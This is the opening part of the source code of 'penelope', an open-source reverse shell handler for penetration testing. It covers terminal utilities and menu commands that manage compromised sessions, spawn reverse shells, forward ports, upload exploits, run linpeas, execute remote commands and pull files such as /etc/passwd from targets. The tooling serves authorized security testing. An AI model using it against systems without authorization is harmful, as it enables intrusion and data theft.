#!/usr/bin/env python3

# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.15.0"

import os
import io
import re
import sys
import pwd
import tty
import ssl
import time
import shlex
import queue
import struct
import shutil
import socket
import signal
import base64
import termios
import tarfile
import logging
import zipfile
import inspect
import warnings
import platform
import threading
import subprocess
import socketserver

from math import ceil
from glob import glob
from json import dumps
from code import interact
from zlib import compress
from errno import EADDRINUSE, EADDRNOTAVAIL
from select import select
from pathlib import Path, PureWindowsPath
from argparse import ArgumentParser, RawTextHelpFormatter
from datetime import datetime
from textwrap import indent, dedent
from binascii import Error as binascii_error
from functools import wraps
from collections import deque, defaultdict
from http.server import SimpleHTTPRequestHandler
from urllib.parse import unquote
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen
from concurrent.futures import ThreadPoolExecutor, as_completed

################################## PYTHON MISSING BATTERIES ####################################
from string import ascii_letters
from random import choice, randint
rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
caller = lambda: inspect.stack()[2].function
bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))

def Open(item, terminal=False):
	if myOS != 'Darwin' and not DISPLAY:
		logger.error("No available $DISPLAY")
		return False

	if not terminal:
		program = 'xdg-open' if myOS != 'Darwin' else 'open'
		args = [item]
	else:
		if not TERMINAL:
			logger.error("No available terminal emulator")
			return False

		if myOS != 'Darwin':
			program = TERMINAL
			_switch = '-e'
			if program in ('gnome-terminal', 'mate-terminal'):
				_switch = '--'
			elif program == 'terminator':
				_switch = '-x'
			elif program == 'xfce4-terminal':
				_switch = '--command='
			args = [_switch, *shlex.split(item)]
		else:
			program = 'osascript'
			args = ['-e', f'tell app "Terminal" to do script "{item}"']

	if not shutil.which(program):
		logger.error(f"Cannot open window: '{program}' binary does not exist")
		return False

	process = subprocess.Popen(
		(program, *args),
		stdin=subprocess.DEVNULL,
		stdout=subprocess.DEVNULL,
		stderr=subprocess.PIPE
	)
	r, _, _ = select([process.stderr], [], [], .01)
	if process.stderr in r:
		error = os.read(process.stderr.fileno(), 1024)
		if error:
			logger.error(error.decode())
			return False
	return True


class Interfaces:

	def __str__(self):
		table = Table(joinchar=' : ')
		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
		for name, ip in self.list.items():
			table += [paint(name).cyan, paint(ip).yellow]
		return str(table)

	def translate(self, interface_name):
		if interface_name in self.list:
			return self.list[interface_name]
		elif interface_name in ('any', 'all'):
			return '0.0.0.0'
		else:
			return interface_name

	@staticmethod
	def ipa(busybox=False):
		interfaces = []
		current_interface = None
		params = ['ip', 'addr']
		if busybox:
			params.insert(0, 'busybox')
		for line in subprocess.check_output(params).decode().splitlines():
			interface = re.search(r"^\d+: (.+?):", line)
			if interface:
				current_interface = interface[1]
				continue
			if current_interface:
				ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
				if ip:
					interfaces.append((current_interface, ip[1]))
					current_interface = None # TODO support multiple IPs in one interface
		return interfaces

	@staticmethod
	def ifconfig():
		output = subprocess.check_output(['ifconfig']).decode()
		return re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)

	@property
	def list(self):
		if shutil.which("ip"):
			interfaces = self.ipa()

		elif shutil.which("ifconfig"):
			interfaces = self.ifconfig()

		elif shutil.which("busybox"):
			interfaces = self.ipa(busybox=True)
		else:
			logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
			return dict()

		return {i[0]:i[1] for i in interfaces}

	@property
	def list_all(self):
		return [item for item in list(self.list.keys()) + list(self.list.values())]


class Table:

	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
		self.list_of_lists = list_of_lists

		self.joinchar = joinchar

		if type(fillchar) is str:
			self.fillchar = [fillchar]
		elif type(fillchar) is list:
			self.fillchar = fillchar
#		self.fillchar[0] = self.fillchar[0][0]

		self.data = []
		self.max_row_len = 0
		self.col_max_lens = []
		if header: self.header = header
		for row in self.list_of_lists:
			self += row

	@property
	def header(self):
		...

	@header.setter
	def header(self, header):
		self.add_row(header, header=True)

	def __str__(self):
		self.fill()
		return "\n".join([self.joinchar.join(row) for row in self.data])

	def __len__(self):
		return len(self.data)

	def add_row(self, row, header=False):
		row_len = len(row)
		if row_len > self.max_row_len:
			self.max_row_len = row_len

		cur_col_len = len(self.col_max_lens)
		for _ in range(row_len - cur_col_len):
			self.col_max_lens.append(0)

		for _ in range(cur_col_len - row_len):
			row.append("")

		new_row = []
		for index, element in enumerate(row):
			if not isinstance(element, (str, paint)):
				element = str(element)
			elem_length = len(element)
			new_row.append(element)
			if elem_length > self.col_max_lens[index]:
				self.col_max_lens[index] = elem_length

		if header:
			self.data.insert(0, new_row)
		else:
			self.data.append(new_row)

	def __iadd__(self, row):
		self.add_row(row)
		return self

	def fill(self):
		for row in self.data:
			for index, element in enumerate(row):
				fillchar = ' '
				if index in [*self.fillchar][1:]:
					fillchar = self.fillchar[0]
				row[index] = element + fillchar * (self.col_max_lens[index] - len(element))


class Size:
	units = ("", "K", "M", "G", "T", "P", "E", "Z", "Y")
	def __init__(self, _bytes):
		self.bytes = _bytes

	def __str__(self):
		index = 0
		new_size = self.bytes
		while new_size >= 1024 and index < len(__class__.units) - 1:
			new_size /= 1024
			index += 1
		return f"{new_size:.1f} {__class__.units[index]}Bytes"

	@classmethod
	def from_str(cls, string):
		if string.isnumeric():
			_bytes = int(string)
		else:
			try:
				num, unit = int(string[:-1]), string[-1]
				_bytes = num * 1024 ** __class__.units.index(unit)
			except:
				logger.error("Invalid size specified")
				return # TEMP
		return cls(_bytes)


from datetime import timedelta
from threading import Thread, RLock, current_thread
class PBar:
	pbars = []

	def __init__(self, end, caption="", barlen=None, queue=None, metric=None):
		self.end = end
		if type(self.end) is not int: self.end = len(self.end)
		self.active = True if self.end > 0 else False
		self.pos = 0
		self.percent = 0
		self.caption = caption
		self.bar = '#'
		self.barlen = barlen
		self.percent_prev = -1
		self.queue = queue
		self.metric = metric
		self.check_interval = 1
		if self.queue: self.trace_thread = Thread(target=self.trace); self.trace_thread.start(); __class__.render_lock = RLock()
		if self.metric: Thread(target=self.watch_speed, daemon=True).start()
		else: self.metric = lambda x: f"{x:,}"
		__class__.pbars.append(self)
		print("\x1b[?25l", end='', flush=True)
		self.render()

	def __bool__(self):
		return self.active

	def __enter__(self):
		return self

	def __exit__(self, exc_type, exc_value, traceback):
		self.terminate()

	def trace(self):
		while True:
			data = self.queue.get()
			self.queue.task_done()
			if isinstance(data, int): self.update(data)
			elif data is None: break
			else: self.print(data)

	def watch_speed(self):
		self.pos_prev = 0
		self.elapsed = 0
		while self:
			time.sleep(self.check_interval)
			self.elapsed += self.check_interval
			self.speed = self.pos - self.pos_prev
			self.pos_prev = self.pos
			self.speed_avg = self.pos / self.elapsed
			if self.speed_avg: self.eta = int(self.end / self.speed_avg) - self.elapsed
			if self: self.render()

	def update(self, step=1):
		if not self: return False
		self.pos += step
		if self.pos >= self.end: self.pos = self.end
		self.percent = int(self.pos * 100 / self.end)
		if self.pos >= self.end: self.terminate()
		if self.percent > self.percent_prev: self.render()

	def render_one(self):
		self.percent_prev = self.percent
		left = f"{self.caption}["
		elapsed = "" if not hasattr(self, 'elapsed') else f" | Elapsed {timedelta(seconds=self.elapsed)}"
		speed = "" if not hasattr(self, 'speed') else f" | {self.metric(self.speed)}/s"
		eta = "" if not hasattr(self, 'eta') else f" | ETA {timedelta(seconds=self.eta)}"
		right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
		bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(right)
		bars = int(self.percent * bar_space / 100) * self.bar
		print(f'\x1b[2K{left}{bars.ljust(bar_space, ".")}{right}\n', end='', flush=True)

	def render(self):
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		for pbar in __class__.pbars: pbar.render_one()
		print(f"\x1b[{len(__class__.pbars)}A", end='', flush=True)
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()

	def print(self, data):
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		print(f"\x1b[2K{data}", flush=True)
		self.render()
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()

	def terminate(self):
		if self.queue and current_thread() != self.trace_thread: self.queue.join(); self.queue.put(None)
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		if not self: return
		self.active = False
		if hasattr(self, 'eta'): del self.eta
		if not any(__class__.pbars):
			self.render()
			print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
			__class__.pbars.clear()
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()


class paint:
	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'orange':136, 'white':231, 'grey':244}
	_escape = lambda codes: f"\001\x1b[{codes}m\002"

	def __init__(self, text=None, colors=None):
		self.text = str(text) if text is not None else None
		self.colors = colors or []

	def __str__(self):
		if self.colors:
			content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
			return __class__._escape(';'.join(self.colors)) + content
		return self.text

	def __len__(self):
		return len(self.text)

	def __add__(self, text):
		return str(self) + str(text)

	def __mul__(self, num):
		return __class__(self.text * num, self.colors)

	def __getattr__(self, attr):
		self.colors.clear()
		for color in attr.split('_'):
			if color in __class__._codes:
				self.colors.append(str(__class__._codes[color]))
			else:
				prefix = "3" if color in __class__._colors else "4"
				self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
		return self


class CustomFormatter(logging.Formatter):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.templates = {
			logging.CRITICAL: {'color':"RED",     'prefix':"[!!!]"},
			logging.ERROR:    {'color':"red",     'prefix':"[-]"},
			logging.WARNING:  {'color':"yellow",  'prefix':"[!]"},
			logging.TRACE:    {'color':"cyan",    'prefix':"[•]"},
			logging.INFO:     {'color':"green",   'prefix':"[+]"},
			logging.DEBUG:    {'color':"magenta", 'prefix':"[DEBUG]"}
		}

	def format(self, record):
		template = self.templates[record.levelno]

		thread = ""
		if record.levelno is logging.DEBUG or options.debug:
			thread = paint(" ") + paint(threading.current_thread().name).white_CYAN

		prefix = "\x1b[2K\r"
		suffix = "\r\n"

		if core.wait_input:
			suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()

		elif core.attached_session:
			suffix += bytes(core.output_line_buffer).decode()

		text = f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}"
		return f"{prefix}{getattr(paint(text), template['color'])}{suffix}"


class LineBuffer:
	def __init__(self, length):
		self.len = length
		self.lines = deque(maxlen=self.len)

	def __lshift__(self, data):
		if isinstance(data, str):
			data = data.encode()
		if self.lines and not self.lines[-1].endswith(b'\n'):
			current_partial = self.lines.pop()
		else:
			current_partial = b''
		self.lines.extend((current_partial + data).split(b'\n'))
		return self

	def __bytes__(self):
		return b'\n'.join(self.lines)

def stdout(data, record=True):
	os.write(sys.stdout.fileno(), data)
	if record:
		core.output_line_buffer << data

def ask(text):
	try:
		try:
			return input(f"{paint(f'[?] {text}').yellow}")

		except EOFError:
			print()
			return ask(text)

	except KeyboardInterrupt:
		print("^C")
		return ' '

def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
	if threading.current_thread().name == 'MainThread':
		signal.signal(signal.SIGINT, keyboard_interrupt)

	if readline:
		readline.set_completer(completer)
		readline.set_completer_delims(completer_delims or default_readline_delims)
		readline.clear_history()
		if histfile:
			try:
				readline.read_history_file(histfile)
			except Exception as e:
				cmdlogger.debug(f"Error loading history file: {e}")
		#readline.set_auto_history(True)

	core.output_line_buffer << b"\n" + text.encode()
	core.wait_input = True

	try:
		response = original_input(text)

		if readline:
			#readline.set_completer(None)
			#readline.set_completer_delims(default_readline_delims)
			if histfile:
				try:
					readline.set_history_length(options.histlength)
					#readline.add_history(response)
					readline.write_history_file(histfile)
				except Exception as e:
					cmdlogger.debug(f"Error writing to history file: {e}")
			#readline.set_auto_history(False)
		return response
	finally:
		core.wait_input = False

class BetterCMD:
	def __init__(self, prompt=None, banner=None, histfile=None, histlen=None):
		self.prompt = prompt
		self.banner = banner
		self.histfile = histfile
		self.histlen = histlen
		self.cmdqueue = []
		self.lastcmd = ''
		self.active = threading.Event()
		self.stop = False

	def show(self):
		print()
		self.active.set()

	def start(self):
		self.preloop()
		if self.banner:
			print(self.banner)

		stop = None
		while not self.stop:
			try:
				try:
					self.active.wait()
					if self.cmdqueue:
						line = self.cmdqueue.pop(0)
					else:
						line = input(self.prompt, self.histfile, self.histlen, self.complete, " \t\n\"'><=;|&(:")

					signal.signal(signal.SIGINT, lambda num, stack: self.interrupt())
					line = self.precmd(line)
					stop = self.onecmd(line)
					stop = self.postcmd(stop, line)
					if stop:
						self.active.clear()
				except EOFError:
					stop = self.onecmd('EOF')
				except Exception:
					custom_excepthook(*sys.exc_info())
			except KeyboardInterrupt:
				print("^C")
				self.interrupt()
		self.postloop()

	def onecmd(self, line):
		cmd, arg, line = self.parseline(line)
		if cmd:
			try:
				func = getattr(self, 'do_' + cmd)
				self.lastcmd = line
			except AttributeError:
				return self.default(line)
			return func(arg)

	def default(self, line):
		cmdlogger.error("Invalid command")

	def interrupt(self):
		pass

	def parseline(self, line):
		line = line.lstrip()
		if not line:
			return None, None, line
		elif line[0] == '!':
			index = line[1:].strip()
			hist_len = readline.get_current_history_length()

			if not index.isnumeric() or not (0 < int(index) < hist_len):
				cmdlogger.error("Invalid command number")
				readline.remove_history_item(hist_len - 1)
				return None, None, line

			line = readline.get_history_item(int(index))
			readline.replace_history_item(hist_len - 1, line)
			return self.parseline(line)

		else:
			parts = line.split(' ', 1)
			if len(parts) == 1:
				return parts[0], None, line
			elif len(parts) == 2:
				return parts[0], parts[1], line

	def precmd(self, line):
		return line

	def postcmd(self, stop, line):
		return stop

	def preloop(self):
		pass

	def postloop(self):
		pass

	def do_reset(self, line):
		"""

		Reset the local terminal
		"""
		if shutil.which("reset"):
			os.system("reset")
		else:
			cmdlogger.error("'reset' command doesn't exist on the system")

	def do_exit(self, line):
		"""

		Exit cmd
		"""
		self.stop = True
		self.active.clear()

	def do_history(self, line):
		"""

		Show Main Menu history
		"""
		if readline:
			hist_len = readline.get_current_history_length()
			max_digits = len(str(hist_len))
			for i in range(1, hist_len + 1):
				print(f"  {i:>{max_digits}}  {readline.get_history_item(i)}")
		else:
			cmdlogger.error("Python is not compiled with readline support")

	def do_DEBUG(self, line):
		"""

		Open debug console
		"""
		import rlcompleter

		if readline:
			readline.clear_history()
			try:
				readline.read_history_file(options.debug_histfile)
			except Exception as e:
				cmdlogger.debug(f"Error loading history file: {e}")

		interact(banner=paint(
			"===> Entering debugging console...").CYAN, local=globals(),
			exitmsg=paint("<=== Leaving debugging console..."
		).CYAN)

		if readline:
			readline.set_history_length(options.histlength)
			try:
				readline.write_history_file(options.debug_histfile)
			except Exception as e:
				cmdlogger.debug(f"Error writing to history file: {e}")

	def completedefault(self, *ignored):
		return []

	def completenames(self, text, *ignored):
		dotext = 'do_' + text
		return [a[3:] for a in dir(self.__class__) if a.startswith(dotext)]

	def complete(self, text, state):
		if state == 0:
			origline = readline.get_line_buffer()
			line = origline.lstrip()
			stripped = len(origline) - len(line)
			begidx = readline.get_begidx() - stripped
			endidx = readline.get_endidx() - stripped
			if begidx > 0:
				cmd, args, foo = self.parseline(line)
				if cmd == '':
					compfunc = self.completedefault
				else:
					try:
						compfunc = getattr(self, 'complete_' + cmd)
					except AttributeError:
						compfunc = self.completedefault
			else:
				compfunc = self.completenames
			self.completion_matches = compfunc(text, line, begidx, endidx)
		try:
			return self.completion_matches[state]
		except IndexError:
			return None
	@staticmethod
	def file_completer(text):
		matches = glob(text + '*')
		matches = [m + '/' if os.path.isdir(m) else m for m in matches]
		#matches = [f"'{m}'" if ' ' in m else m for m in matches]
		return matches

##########################################################################################################

class MainMenu(BetterCMD):

	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
			"Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	@property
	def active_sessions(self):
		active_sessions = len(core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def get_core_id_completion(text, *extra, attr='sessions'):
		options = list(map(str, getattr(core, attr)))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	def set_id(self, ID):
		self.sid = ID
		session_part = (
				f"{paint('─(').cyan_DIM}{paint('Session').green} "
				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
		) if self.sid else ''
		self.prompt = (
				f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
				f"{session_part}{paint('>').cyan_DIM} "
		)

	def session_operation(current=False, extra=[]):
		def inner(func):
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if core.sessions:
							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
						else:
							cmdlogger.warning("No available sessions to perform this action")
						return False
				else:
					if ID:
						if ID.isnumeric() and int(ID) in core.sessions:
							ID = int(ID)
						elif ID not in extra:
							cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def interrupt(self):
		if core.attached_session and not core.attached_session.type == 'Readline':
			core.attached_session.detach()
		else:
			if menu.sid and not core.sessions[menu.sid].agent: # TEMP
				core.sessions[menu.sid].control_session.subchannel.control << 'stop'

	def show_help(self, command):
		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
		parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = help_prompt.sub('', part)
			modified_parts.append(part)
		print(indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					cmdlogger.warning(
						f"No such command: '{command}'. "
						"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session_operation(extra=['none'])
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use 1		Select the SessionID 1
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		Show active sessions or interact with the SessionID

		Examples:

			sessions		Show active sessions
			sessions 1		Interact with SessionID 1
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for host, sessions in core.hosts.items():
					if not sessions:
						continue
					print('\n➤  ' + sessions[0].name_colored)
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							if session.host_needs_control_session and session.control_session is session:
								ID = paint(' ' + str(session.id)).cyan
							else:
								ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = session.listener or f'Connect({session._host}:{session.port})'
						table += [
							ID,
							paint(session.type).CYAN if session.type == 'PTY' else session.type,
							session.user or 'N/A',
							source
						]
					print("\n", indent(str(table), "    "), "\n", sep="")
			else:
				print()
				cmdlogger.warning(f"No sessions yet {EMOJIS['no_sessions']}")
				print()

	@session_operation()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact 1	Interact with SessionID 1
		"""
		return core.sessions[ID].attach()

	@session_operation(extra=['*'])
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill 1		Kill SessionID 1
			kill *		Kill all sessions
		"""

		if ID == '*':
			if not core.sessions:
				cmdlogger.warning("No sessions to kill")
				return False
			else:
				if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
					if options.maintain > 1:
						options.maintain = 1
						self.onecmd("maintain")
					for session in reversed(list(core.sessions.copy().values())):
						session.kill()
		else:
			core.sessions[ID].kill()

		if options.single_session and len(core.sessions) == 1:
			core.stop()
			logger.info("Penelope exited due to Single Session mode")
			return True

	@session_operation(current=True)
	def do_portfwd(self, line):
		"""
		host:port(<-|->)host:port
		Local and Remote port forwarding

		Examples:

			-> 192.168.0.1:80		Forward 127.0.0.1:80 to 192.168.0.1:80
			0.0.0.0:8080 -> 192.168.0.1:80	Forward 0.0.0.0:8080 to 192.168.0.1:80
		"""
		if not line:
			cmdlogger.warning("No parameters...")
			return False

		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
		if match:
			group1 = match.group(1)
			arrow = match.group(2)
			group2 = match.group(3)
		else:
			cmdlogger.warning("Invalid syntax")
			return False

		if arrow == '->':
			_type = 'L'
			lhost = "127.0.0.1"

			if group2:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
				if match:
					rhost = match.group(1)
					rport = match.group(2)
					lport = rport
				if not rport:
					cmdlogger.warning("At least remote port is required")
					return False
			else:
				cmdlogger.warning("At least remote port is required")
				return False

			if group1:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
				if match:
					lhost = match.group(1)
					lport = match.group(2)
				else:
					cmdlogger.warning("Invalid syntax")
					return False

		elif arrow == '<-':
			_type = 'R'

			if group2:
				rhost, rport = group2.split(':')

			if group1:
				lhost, lport = group1.split(':')
			else:
				cmdlogger.warning("At least local port is required")
				return False

		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))

	@session_operation(current=True)
	def do_download(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		if remote_items:
			core.sessions[self.sid].download(remote_items)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_open(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target and open them locally

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_items:
			items = core.sessions[self.sid].download(remote_items)

			if len(items) > options.max_open_files:
				cmdlogger.warning(
					f"More than {options.max_open_files} items selected"
					" for opening. The open list is truncated to "
					f"{options.max_open_files}."
				)
				items = items[:options.max_open_files]

			for item in items:
				Open(item)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_upload(self, local_items):
		"""
		<glob|URL>...
		Upload files / folders / HTTP(S)/FTP(S) URLs to the target
		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
		when the target has no Internet access

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
		"""
		if local_items:
			core.sessions[self.sid].upload(local_items, randomize_fname=options.upload_random_suffix)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_script(self, local_item):
		"""
		<local_script|URL>
		In-memory local or URL script execution & real time downloaded output

		Examples:
			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if local_item:
			core.sessions[self.sid].script(local_item)
		else:
			cmdlogger.warning("No script to execute")

	@staticmethod
	def show_modules():
		categories = defaultdict(list)
		for module in modules().values():
			categories[module.category].append(module)

		print()
		for category in categories:
			print("  " + str(paint(category).BLUE))
			table = Table(joinchar=' │ ')
			for module in categories[category]:
				description = module.run.__doc__ or ""
				if description:
					description = module.run.__doc__.strip().splitlines()[0]
				table += [paint(module.__name__).red, description]
			print(indent(str(table), '  '), "\n", sep="")

	@session_operation(current=True)
	def do_run(self, line):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules"""
		try:
			parts = line.split(" ", 1)
			module_name = parts[0]
		except:
			module_name = None
			print()
			cmdlogger.warning(paint("Select a module").YELLOW_white)

		if module_name:
			module = modules().get(module_name)
			if module:
				args = parts[1] if len(parts) == 2 else ''
				module.run(core.sessions[self.sid], args)
			else:
				cmdlogger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session_operation(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn a new session.

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. On the other tab run: ./penelope.py 5555

			spawn 3333 10.10.10.10	Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				options.maintain = num
				refreshed = False
				for host in core.hosts.values():
					if len(host) < num:
						refreshed = True
						host[0].maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
			cmdlogger.info(f"Maintain value set to {paint(options.maintain).yellow} {status}")

	@session_operation(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		core.sessions[self.sid].upgrade()

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the session's local folder. If no session specified, open the base folder
		"""
		folder = core.sessions[self.sid].directory if self.sid else options.basedir
		Open(folder)
		print(folder)

	@session_operation(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a remote command

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			if core.sessions[self.sid].agent:
				core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					stdout_dst=sys.stdout.buffer,
					stderr_dst=sys.stderr.buffer
				)
			else:
				output = core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					value=True
				)
				print(output)
		else:
			cmdlogger.warning("No command to execute")

	'''@session_operation(current=True) # TODO
	def do_tasks(self, line):
		"""

		Show assigned tasks
		"""
		table = Table(joinchar=' | ')
		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

		for sessionid in core.sessions:
			tasks = core.sessions[sessionid].tasks
			for taskid in tasks:
				for stream in tasks[taskid]['streams'].values():
					if stream.closed:
						status = paint('Completed!').GREEN
						break
				else:
					status = paint('Active...').YELLOW

				table += [
					paint(sessionid).red,
					paint(taskid).cyan,
					paint(tasks[taskid]['pid']).blue,
					paint(tasks[taskid]['command']).yellow,
					paint(tasks[taskid]['streams']['1'].name).green,
					status
				]

		if len(table) > 1:
			print(table)
		else:
			logger.warning("No assigned tasks")'''

	def do_listeners(self, line):
		"""
